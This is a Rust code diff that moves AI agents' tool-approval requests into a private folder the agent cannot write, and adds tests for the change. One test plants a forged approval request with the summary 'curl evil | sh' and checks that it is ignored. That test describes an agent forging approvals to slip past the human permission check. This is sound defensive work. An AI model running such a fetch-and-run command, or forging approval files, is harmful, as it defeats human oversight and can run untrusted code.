@@ -536,8 +536,9 @@ pub struct TerminalTab {
     pub turn_tracker: crate::agent_turn_status::TabTurnTracker,
     /// Permission mode active when this tab was spawned (`#656`).
     pub permission_mode: crate::agent_permissions::AgentPermissionMode,
-    /// Per-tab approvals directory `<session_dir>/approvals/tab-<id>` (`#656`).
-    pub approvals_dir: PathBuf,
+    /// Per-tab approvals folder in the session's Studio-private channel (`agent_approval_channel`), where the tab's hook raises
+    /// requests and Studio answers them. `None` for a tab without a session, and when the platform has no private folder.
+    pub approvals_dir: Option<PathBuf>,
     /// Pending approval requests queued for this tab (`#656`).
     pub pending_approvals: Vec<crate::agent_permissions::ApprovalRequest>,
     /// Active stop sequence state (`#684`), or `None` when not stopping.
@@ -675,12 +676,13 @@ impl TerminalTab {
                 let _ = std::fs::remove_dir_all(sess.session_dir.join(lock_name));
             }
         }
-        let approvals_dir = session
-            .map(|s| crate::agent_permissions::tab_approvals_dir(&s.session_dir, id))
-            .unwrap_or_else(|| std::env::temp_dir().join(format!("designos-approvals-tab-{id}")));
+        // A new tab starts with an empty approvals folder: requests of an earlier run with the same id are not its own.
+        let approvals_dir = session.and_then(|s| crate::agent_approval_channel::tab_approvals_dir(&s.session_dir, id));
+        if let Some(sess) = session {
+            crate::agent_approval_channel::remove_tab_dir(&sess.session_dir, id);
+        }
         configure_pty_env_with_session(&mut cmd, preset, file_path, session);
         if session.is_some() {
-            cmd.env("DESIGNOS_APPROVALS_DIR", approvals_dir.as_os_str());
             cmd.env("DESIGNOS_TAB_ID", id.to_string());
         }
 
@@ -1260,7 +1262,7 @@ pub struct TerminalState {
     pub status_changes: Vec<(usize, AgentTabStatus)>,
     /// Permission mode for newly spawned agent tabs (`Skip` vs `Ask`, `#656`).
     pub permission_mode: crate::agent_permissions::AgentPermissionMode,
-    /// Queued in-panel approval requests read from `<session_dir>/approvals/` (`#656`).
+    /// Queued in-panel approval requests read from the active tab's private approvals folder (`#656`).
     pub pending_approvals: Vec<crate::agent_permissions::ApprovalRequest>,
     /// Latch ensuring at most one OS notification per waiting episode (`#656`).
     pub notification_latch: crate::agent_permissions::NotificationLatch,
@@ -1557,34 +1559,28 @@ impl TerminalState {
         self.active_tab().is_some_and(|t| t.needs_approval())
     }
 
-    fn withdraw_tab_approvals(session_dir: &Path, tab: &mut TerminalTab) {
-        crate::agent_permissions::withdraw_pending_requests_in_dir(&tab.approvals_dir);
-        for req in tab.pending_approvals.drain(..) {
-            let root_req = crate::agent_permissions::approvals_dir(session_dir).join(format!("{}.request.json", req.id));
-            if root_req.exists() {
-                let _ = crate::agent_permissions::write_approval_answer(session_dir, &req.id, crate::agent_permissions::ApprovalDecision::Withdrawn);
-            }
+    fn withdraw_tab_approvals(tab: &mut TerminalTab) {
+        if let Some(dir) = &tab.approvals_dir {
+            crate::agent_permissions::withdraw_pending_requests_in_dir(dir);
         }
+        tab.pending_approvals.clear();
     }
 
     fn sync_active_tab_approvals(&mut self) {
         self.pending_approvals = self.active_tab().map(|t| t.pending_approvals.clone()).unwrap_or_default();
     }
 
-    /// Writes `decision` (`Allow` or `Deny`) for `request_id` into the active tab's approvals folder
-    /// (and `<session_dir>/approvals/<id>.answer` if present) and removes the answered entry (`#656`).
+    /// Writes `decision` (`Allow` or `Deny`) for `request_id` into the active tab's private approvals folder, when the
+    /// request is still pending there, and removes the answered entry (`#656`). A folder the agent can write is never
+    /// read or written.
     pub fn answer_pending_approval(&mut self, request_id: &str, decision: crate::agent_permissions::ApprovalDecision) {
-        let mut wrote_tab = false;
         if let Some(tab) = self.active_tab_mut() {
-            if tab.approvals_dir.join(format!("{request_id}.request.json")).exists() {
-                let _ = crate::agent_permissions::write_approval_answer_in_dir(&tab.approvals_dir, request_id, decision);
-                wrote_tab = true;
+            if let Some(dir) = tab.approvals_dir.as_ref().filter(|dir| dir.join(format!("{request_id}.request.json")).exists()) {
+                if let Err(e) = crate::agent_permissions::write_approval_answer_in_dir(dir, request_id, decision) {
+                    eprintln!("design:os studio: could not write the approval answer for request {request_id}: {e}");
+                }
             }
             tab.pending_approvals.retain(|r| r.id != request_id);
-        }
-        let root_req = crate::agent_permissions::approvals_dir(&self.session_dir).join(format!("{request_id}.request.json"));
-        if !wrote_tab || root_req.exists() {
-            let _ = crate::agent_permissions::write_approval_answer(&self.session_dir, request_id, decision);
         }
         self.pending_approvals.retain(|r| r.id != request_id);
         if self.pending_approvals.is_empty() {
@@ -1624,8 +1620,10 @@ impl TerminalState {
             tab.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
         }
         let now = crate::agent_sessions::unix_timestamp_secs();
-        let approvals_dir = crate::agent_permissions::approvals_dir(&self.session_dir);
-        let _ = std::fs::create_dir_all(&approvals_dir);
+        let Some(approvals_dir) = self.active_tab().and_then(|tab| tab.approvals_dir.clone()) else {
+            return;
+        };
+        let _ = crate::agent_approval_channel::create_private_dir_all(&approvals_dir);
         match preset_slug {
             "agents-approval-command" => {
                 if let Some(tab) = self.active_tab_mut() {
@@ -1842,6 +1840,10 @@ impl TerminalState {
         self.selection_spec_path = session_dir.join("selection.spec.json");
         self.bootstrap_md_path = session_dir.join("bootstrap.md");
         self.bootstrap_json_path = session_dir.join("bootstrap.json");
+        // The folder being left takes its approval channel with it, unless a tab still runs on it.
+        if self.tabs.is_empty() && self.session_dir != session_dir {
+            crate::agent_approval_channel::remove_channel(&self.session_dir);
+        }
         self.session_dir = session_dir;
         // A reply a run left in the folder now bound (Studio quit before the prompt hook ran) must not reach this run's prompts.
         crate::skills::hook_delivery::remove_all_replies(&self.session_dir);
@@ -1856,10 +1858,9 @@ impl TerminalState {
         self.bootstrap_generation.store(0, std::sync::atomic::Ordering::SeqCst);
         self.pending_approvals.clear();
         for tab in &mut self.tabs {
-            tab.approvals_dir = crate::agent_permissions::tab_approvals_dir(&self.session_dir, tab.id);
+            tab.approvals_dir = crate::agent_approval_channel::tab_approvals_dir(&self.session_dir, tab.id);
             tab.pending_approvals.clear();
         }
-        crate::agent_permissions::cleanup_stale_approvals(&self.session_dir, crate::agent_sessions::unix_timestamp_secs());
         self.last_agent_status_done = false;
     }
 
@@ -2673,6 +2674,10 @@ impl TerminalState {
     fn cleanup_ephemeral_session_dir(&mut self) {
         self.snapshot_worker.cancel_and_wait();
         self.stop_bootstrap_writes();
+        // No tab is left to ask: the approval channel (hook script, requests, answers) goes with the session.
+        if self.tabs.is_empty() {
+            crate::agent_approval_channel::remove_channel(&self.session_dir);
+        }
         if crate::agent_session_files::is_ephemeral_session_dir(&self.session_dir) {
             if self.lock_owner.is_some() {
                 if let crate::agent_sessions::SessionKey::LibraryFile { ref lib_root, ref file_id } = self.key {
@@ -2703,7 +2708,9 @@ impl TerminalState {
     pub fn shutdown(&mut self) {
         // Skills waiting for a first prompt that never came must not reach a later prompt of this file (`#573`).
         self.delete_skills_replies();
-        crate::agent_permissions::withdraw_pending_requests(&self.session_dir);
+        for tab in &mut self.tabs {
+            Self::withdraw_tab_approvals(tab);
+        }
         self.pending_approvals.clear();
         let mut reg_dirty = false;
         let now = crate::agent_sessions::unix_timestamp_secs();
@@ -3129,7 +3136,7 @@ impl TerminalState {
         if idx < self.tabs.len() {
             let mut removed = self.tabs.remove(idx);
             let _ = removed.child.kill();
-            Self::withdraw_tab_approvals(&self.session_dir, &mut removed);
+            Self::withdraw_tab_approvals(&mut removed);
             if let Some(entry) = self.session_registry.find_entry_mut(removed.id as u64, removed.session_uuid.as_deref()) {
                 if entry.status == crate::agent_sessions::SessionEntryStatus::Active {
                     entry.status = crate::agent_sessions::SessionEntryStatus::Exited;
@@ -3142,7 +3149,6 @@ impl TerminalState {
             } else if self.tabs.is_empty() {
                 self.active_tab = 0;
                 self.picker_open = true;
-                crate::agent_permissions::withdraw_pending_requests(&self.session_dir);
             }
             self.sync_active_tab_approvals();
         }
@@ -3309,45 +3315,31 @@ impl TerminalState {
             }
         }
 
-        // Channel 4: Per-tab approvals/ directories written by Claude PreToolUse approval hook (#656)
+        // Channel 4: each tab's folder in the Studio-private approval channel, written by Claude's PermissionRequest hook (#656).
+        // No folder an agent can write is polled: a request file there is the agent's own doing, not the hook's.
         let now_secs = crate::agent_sessions::unix_timestamp_secs();
-        let root_approvals = crate::agent_permissions::approvals_dir(&self.session_dir);
-        let root_polled = if root_approvals.is_dir() {
-            crate::agent_permissions::poll_approvals_in_dir(&root_approvals, now_secs, crate::agent_permissions::APPROVAL_HOOK_TIMEOUT_SECS)
-        } else {
-            Vec::new()
-        };
 
         if self.tabs.is_empty() {
-            self.pending_approvals = root_polled;
+            self.pending_approvals.clear();
         } else {
-            let active_idx = self.active_tab.min(self.tabs.len().saturating_sub(1));
             let mut next_per_tab: Vec<Vec<crate::agent_permissions::ApprovalRequest>> = self
                 .tabs
                 .iter_mut()
                 .map(|tab| {
-                    tab.approvals_dir = crate::agent_permissions::tab_approvals_dir(&self.session_dir, tab.id);
-                    if tab.approvals_dir.is_dir() {
-                        crate::agent_permissions::poll_approvals_in_dir(&tab.approvals_dir, now_secs, crate::agent_permissions::APPROVAL_HOOK_TIMEOUT_SECS)
-                    } else {
-                        Vec::new()
+                    tab.approvals_dir = crate::agent_approval_channel::tab_approvals_dir(&self.session_dir, tab.id);
+                    match tab.approvals_dir.as_deref().filter(|dir| dir.is_dir()) {
+                        Some(dir) => crate::agent_permissions::poll_approvals_in_dir(dir, now_secs, crate::agent_permissions::APPROVAL_HOOK_TIMEOUT_SECS),
+                        None => Vec::new(),
                     }
                 })
                 .collect();
-
-            for req in root_polled {
-                let owner_idx = self.tabs.iter().position(|t| t.pending_approvals.iter().any(|r| r.id == req.id)).unwrap_or(active_idx);
-                if !next_per_tab[owner_idx].iter().any(|r| r.id == req.id) {
-                    next_per_tab[owner_idx].push(req);
-                }
-            }
 
             for (idx, tab) in self.tabs.iter_mut().enumerate() {
                 let had_pending = !tab.pending_approvals.is_empty();
                 let mut polled = std::mem::take(&mut next_per_tab[idx]);
                 polled.sort_by(|a, b| (a.timestamp, &a.id).cmp(&(b.timestamp, &b.id)));
                 if tabs_left_waiting.contains(&idx) && polled.is_empty() {
-                    Self::withdraw_tab_approvals(&self.session_dir, tab);
+                    Self::withdraw_tab_approvals(tab);
                 } else {
                     tab.pending_approvals = polled;
                 }
@@ -3527,7 +3519,7 @@ impl TerminalState {
                 if let Ok(mut parser) = tab.parser.lock() {
                     parser.process("\r\n[design:os] Agent exited — this tab no longer accepts input. Open a new tab to continue.\r\n".as_bytes());
                 }
-                Self::withdraw_tab_approvals(&self.session_dir, tab);
+                Self::withdraw_tab_approvals(tab);
                 if let Ok(mut st) = tab.agent_status.lock() {
                     if matches!(*st, AgentTabStatus::WaitingForInput(_)) {
                         *st = AgentTabStatus::Idle;
@@ -4608,7 +4600,20 @@ pub(crate) fn write_session_agent_files_for_job(job: &crate::agent_session_files
     let bootstrap_reply_path = job.session_dir.join("bootstrap-context-reply.json");
     let delivered_marker_path = job.session_dir.join(format!("bootstrap.delivered.{}", job.bootstrap_run_id));
     let status_path = job.session_dir.join("agent-status.json");
-    let approve_script_path = job.ask_mode.then(|| crate::agent_permissions::write_approval_hook_script(&job.session_dir));
+    // The hook script is written to the Studio-private channel folder, before `hooks.json` names it. When it cannot be
+    // installed there (no private data folder, or the folder cannot be made private) `hooks.json` carries no approval
+    // handler and Claude asks in its own terminal prompt: nothing is approved on the way.
+    let approve_script_path = if job.ask_mode {
+        match crate::agent_permissions::write_approval_hook_script(&job.session_dir) {
+            Ok(path) => Some(path),
+            Err(e) => {
+                eprintln!("design:os studio: in-panel approvals are off for this session, Claude will ask in its terminal: {e}");
+                None
+            }
+        }
+    } else {
+        None
+    };
     let transcript_capture_path = job.session_dir.join(crate::agent_usage::CLAUDE_TRANSCRIPT_META_FILENAME);
     let claude_hooks = session_hooks_settings_with_approval(
         &status_path,
@@ -8822,6 +8827,11 @@ mod tests {
         ScopedTerminalState::new(TerminalState::for_tab(tab_id))
     }
 
+    /// The private approvals folder of tab `idx`.
+    fn tab_approvals_of(st: &TerminalState, idx: usize) -> PathBuf {
+        st.tabs[idx].approvals_dir.clone().expect("a session tab has a private approvals folder")
+    }
+
     fn spawn_mock_agent_tab(st: &mut TerminalState, preset: AgentCliPreset, session_uuid: Option<&str>) -> usize {
         let _ = std::fs::create_dir_all(&st.session_dir);
         st.spawn_tab(AgentCliPreset::Shell, None).expect("spawn shell backing tab");
@@ -9200,14 +9210,56 @@ mod tests {
                 assert_eq!(claude_permission.len(), 2, "Claude PermissionRequest = status handler + approval handler: {claude_permission:?}");
                 assert_eq!(approve.len(), 1);
                 assert_eq!(approve[0]["timeout"].as_u64(), Some(crate::agent_permissions::APPROVAL_HOOK_TIMEOUT_SECS));
-                assert!(st.session_dir.join("approve-hook.sh").is_file(), "approve-hook.sh must be written for the hook to run");
+                let script = crate::agent_approval_channel::hook_script_path(&st.session_dir).expect("a private channel folder");
+                assert!(script.is_file(), "approve-hook.sh must be written for the hook to run");
+                assert_eq!(approve[0]["command"].as_str(), crate::agent_permissions::approval_hook_handler(&script)["command"].as_str());
+                assert!(!st.session_dir.join("approve-hook.sh").exists(), "the hook must not sit in the folder the agent can write");
             } else {
                 assert_eq!(claude_permission.len(), 1, "Skip mode keeps only the status handler: {claude_permission:?}");
                 assert!(approve.is_empty(), "Skip mode must not install the approval hook");
+                let channel = crate::agent_approval_channel::channel_dir(&st.session_dir).expect("a private channel location");
+                assert!(!channel.exists(), "Skip mode creates no approval channel: {}", channel.display());
             }
             assert_eq!(hook_handlers(&grok, "PermissionRequest").len(), 1, "Grok never runs the Claude approval script");
+            crate::agent_approval_channel::remove_channel(&st.session_dir);
             let _ = std::fs::remove_dir_all(&st.session_dir);
         }
+    }
+
+    /// The approval channel is the session's: closing one tab withdraws that tab's requests and keeps the others, and the
+    /// whole private folder goes when the session shuts down or moves to another folder.
+    #[test]
+    fn the_private_channel_goes_with_the_session() {
+        let mut st = isolated_683_state(68414);
+        st.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
+        let first = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-channel-1"));
+        let second = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-channel-2"));
+        let script = crate::agent_permissions::write_approval_hook_script(&st.session_dir).expect("install the hook");
+        let channel = crate::agent_approval_channel::channel_dir(&st.session_dir).unwrap();
+        let (first_dir, second_dir) = (tab_approvals_of(&st, first), tab_approvals_of(&st, second));
+        for (dir, id) in [(&first_dir, "8001-Bash"), (&second_dir, "8002-Bash")] {
+            crate::agent_approval_channel::create_private_dir_all(dir).unwrap();
+            let request = serde_json::json!({ "id": id, "tool_name": "Bash", "summary": "ls", "timestamp": crate::agent_sessions::unix_timestamp_secs() });
+            std::fs::write(dir.join(format!("{id}.request.json")), request.to_string()).unwrap();
+        }
+
+        st.close_tab(first);
+        assert_eq!(std::fs::read_to_string(first_dir.join("8001-Bash.answer")).unwrap().trim(), "withdrawn", "the closed tab's request is withdrawn");
+        assert!(!second_dir.join("8002-Bash.answer").exists(), "the other tab's request is left alone");
+        assert!(script.is_file() && channel.is_dir(), "a tab is still running: the channel stays");
+
+        st.shutdown();
+        assert!(!channel.exists(), "shutting the session down removes the private channel: {}", channel.display());
+
+        // A session that moves to another folder, with no tab left, takes its channel along.
+        let old_session = st.session_dir.clone();
+        crate::agent_permissions::write_approval_hook_script(&old_session).expect("install the hook again");
+        let old_channel = crate::agent_approval_channel::channel_dir(&old_session).unwrap();
+        st.bind_session(&format!("68414-moved-{}", std::process::id()));
+        assert_ne!(st.session_dir, old_session);
+        assert!(!old_channel.exists(), "the channel of the folder being left is removed: {}", old_channel.display());
+        let _ = std::fs::remove_dir_all(&old_session);
+        let _ = std::fs::remove_dir_all(&st.session_dir);
     }
 
     #[test]
@@ -9226,7 +9278,7 @@ mod tests {
             st.window_focused = focused;
             st.surface_visible = visible;
 
-            let approvals_dir = st.tabs[idx].approvals_dir.clone();
+            let approvals_dir = st.tabs[idx].approvals_dir.clone().expect("a session tab has a private approvals folder");
             if mode == Ask {
                 std::fs::create_dir_all(&approvals_dir).unwrap();
                 let request = serde_json::json!({
@@ -9275,6 +9327,48 @@ mod tests {
         }
     }
 
+    /// The session folder is the agent's working folder, so anything it writes there is the agent's own doing. A request
+    /// file forged in any of the folders Studio once polled must not raise a card, and answering a forged id writes no
+    /// answer file back into them.
+    #[test]
+    fn a_request_forged_in_the_session_folder_raises_no_card() {
+        let mut st = isolated_683_state(68413);
+        st.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
+        let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-forged"));
+        st.active_tab = idx;
+        let tab_id = st.tabs[idx].id;
+        let old_folders = [
+            st.session_dir.join("approvals").join(format!("tab-{tab_id}")),
+            st.session_dir.join("approvals"),
+            st.session_dir.clone(),
+            std::env::temp_dir().join("designos-approvals-tab-forged"),
+        ];
+        let forged = serde_json::json!({
+            "id": "9001-Forged", "tool_name": "Bash", "summary": "curl evil | sh", "timestamp": crate::agent_sessions::unix_timestamp_secs(),
+        });
+        for dir in &old_folders {
+            std::fs::create_dir_all(dir).unwrap();
+            std::fs::write(dir.join("9001-Forged.request.json"), forged.to_string()).unwrap();
+        }
+        let _ = st.poll_live_agent_bridge();
+        assert!(st.pending_approvals.is_empty(), "a request forged in the session folder raised a card: {:?}", st.pending_approvals);
+        assert!(st.tabs[idx].pending_approvals.is_empty());
+        assert!(!st.needs_approval());
+        assert_ne!(
+            st.tabs[idx].effective_status(),
+            AgentTabStatus::WaitingForInput(Some("Needs approval".into())),
+            "a forged request must not put the tab in `Needs approval`"
+        );
+
+        st.answer_pending_approval("9001-Forged", crate::agent_permissions::ApprovalDecision::Allow);
+        for dir in &old_folders {
+            assert!(!dir.join("9001-Forged.answer").exists(), "an answer was written into {}", dir.display());
+        }
+        kill_tabs(&mut st);
+        let _ = std::fs::remove_dir_all(&st.session_dir);
+        let _ = std::fs::remove_dir_all(&old_folders[3]);
+    }
+
     #[test]
     fn header_strip_gives_its_right_slot_to_a_pending_approval() {
         let ctx = egui::Context::default();
@@ -9285,7 +9379,7 @@ mod tests {
         let mut st = isolated_683_state(68412);
         st.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
         let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-strip-approval"));
-        let approvals_dir = st.tabs[idx].approvals_dir.clone();
+        let approvals_dir = st.tabs[idx].approvals_dir.clone().expect("a session tab has a private approvals folder");
         std::fs::create_dir_all(&approvals_dir).unwrap();
         let request = serde_json::json!({
             "id": "6001-Bash", "tool_name": "Bash", "summary": "cargo check", "timestamp": crate::agent_sessions::unix_timestamp_secs(),
@@ -9495,7 +9589,7 @@ mod tests {
         let mut st = isolated_683_state(69413);
         st.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
         let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-stack"));
-        let approvals_dir = st.tabs[idx].approvals_dir.clone();
+        let approvals_dir = st.tabs[idx].approvals_dir.clone().expect("a session tab has a private approvals folder");
         std::fs::create_dir_all(&approvals_dir).unwrap();
         let events_path = st.session_dir.join("agent-events.jsonl");
         // Turn 1 finished (receipt row), turn 2 is waiting on a permission request (approval card).
@@ -9932,8 +10026,8 @@ mod tests {
             tab.title = "Claude CLI #1".into();
         }
 
-        let approvals_dir = crate::agent_permissions::approvals_dir(&st.session_dir);
-        std::fs::create_dir_all(&approvals_dir).unwrap();
+        let approvals_dir = st.active_tab().and_then(|tab| tab.approvals_dir.clone()).expect("a session tab has a private approvals folder");
+        crate::agent_approval_channel::create_private_dir_all(&approvals_dir).unwrap();
         let now = crate::agent_sessions::unix_timestamp_secs();
 
         // 1. Write a request and verify the approval card surfaces and clicking Approve writes "allow"
@@ -10113,8 +10207,8 @@ mod tests {
             tab.preset = AgentCliPreset::Claude;
         }
 
-        let approvals_dir = crate::agent_permissions::approvals_dir(&st.session_dir);
-        std::fs::create_dir_all(&approvals_dir).unwrap();
+        let approvals_dir = st.active_tab().and_then(|tab| tab.approvals_dir.clone()).expect("a session tab has a private approvals folder");
+        crate::agent_approval_channel::create_private_dir_all(&approvals_dir).unwrap();
         let req = serde_json::json!({
             "id": "3001-Bash",
             "tool_name": "Bash",
@@ -10195,8 +10289,8 @@ mod tests {
                 tab.id
             })
             .expect("tab 1 exists");
-        let tab1_approvals_dir = crate::agent_permissions::tab_approvals_dir(&st.session_dir, tab1_id);
-        std::fs::create_dir_all(&tab1_approvals_dir).unwrap();
+        let tab1_approvals_dir = crate::agent_approval_channel::tab_approvals_dir(&st.session_dir, tab1_id).expect("a private approvals folder");
+        crate::agent_approval_channel::create_private_dir_all(&tab1_approvals_dir).unwrap();
         let req_path = tab1_approvals_dir.join("4001-Bash.request.json");
         let req = serde_json::json!({
             "id": "4001-Bash",
@@ -10210,12 +10304,12 @@ mod tests {
         assert_eq!(st.pending_approvals.len(), 1);
 
         // Open a second tab, give it its own per-tab pending approval, and close Tab 2:
-        // Tab 2's request in approvals/tab-<tab2_id>/ must be withdrawn while Tab 1's request in approvals/tab-<tab1_id>/ survives.
+        // Tab 2's request in its own private tab folder must be withdrawn while Tab 1's request in its folder survives.
         let _ = st.spawn_tab(AgentCliPreset::Shell, None);
         assert_eq!(st.tabs.len(), 2);
         let tab2_id = st.tabs[1].id;
-        let tab2_approvals_dir = crate::agent_permissions::tab_approvals_dir(&st.session_dir, tab2_id);
-        std::fs::create_dir_all(&tab2_approvals_dir).unwrap();
+        let tab2_approvals_dir = crate::agent_approval_channel::tab_approvals_dir(&st.session_dir, tab2_id).expect("a private approvals folder");
+        crate::agent_approval_channel::create_private_dir_all(&tab2_approvals_dir).unwrap();
         let tab2_req_path = tab2_approvals_dir.join("4002-Bash.request.json");
         let tab2_ans_path = tab2_approvals_dir.join("4002-Bash.answer");
         let tab2_req = serde_json::json!({
